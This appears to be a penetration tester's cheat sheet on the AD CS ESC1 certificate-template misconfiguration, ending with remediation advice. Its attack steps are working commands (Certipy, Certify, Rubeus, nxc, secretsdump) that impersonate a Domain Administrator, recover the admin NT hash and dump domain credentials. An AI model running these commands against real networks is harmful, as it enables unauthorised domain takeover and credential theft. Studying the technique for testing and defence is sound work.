# ESC1 - Enrollee Supplies Subject (SAN Abuse)


## Why It's Vulnerable

The template has **"Enrollee Supplies Subject"** enabled - you can put **any name you want** in the SAN when requesting a cert. The CA signs whatever you ask for.

Two conditions must also be true:
- You (a low-priv user) have **enrollment rights** on the template
- The certificate can be used for **Client Authentication** (so you can actually log in with it)

## How to Identify It

Certipy output will show:
```
[!] Vulnerabilities
    ESC1: 'CORP\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

## The Attack

**Step 1 - Request a cert as Domain Admin**
```sh
certipy req -u user@corp.local -p pass -dc-ip <DC-IP> \
  -ca CORP-CA \
  -template VulnerableTemplate \
  -upn administrator@corp.local

# Output: administrator.pfx
```

| Flag | What it does |
|---|---|
| `-ca` | Name of the Certificate Authority - from certipy find output |
| `-template` | Name of the vulnerable template |
| `-upn` | The UPN to put in the SAN - use DA's UPN |

**Step 2 - Use the cert to get a TGT + NT hash**
```sh
certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
```

Output:
```
[*] Got hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
```

**Step 3 - Use the hash**
```sh
nxc smb <DC-IP> -u administrator -H fc525c9683e8fe067095ba2ddc971889
secretsdump.py corp.local/administrator@<DC-IP> -hashes :fc525c9683e8fe067095ba2ddc971889
```

### Certify.exe (Windows alternative)

```powershell
# Request the cert - Certify prints a base64 PFX
Certify.exe request /ca:CA-HOST\CORP-CA /template:VulnerableTemplate /altname:administrator

# PKINIT auth -> TGT + NT hash (via UnPAC)
Rubeus.exe asktgt /user:administrator /certificate:<base64-pfx> /nowrap /getcredentials
```

---

## Remediation

Disable **"Supply in the request"** in the template's Subject Name tab. Set it to "Build from Active Directory information." If SAN flexibility is genuinely needed, restrict enrollment to a specific privileged group, not Domain Users.
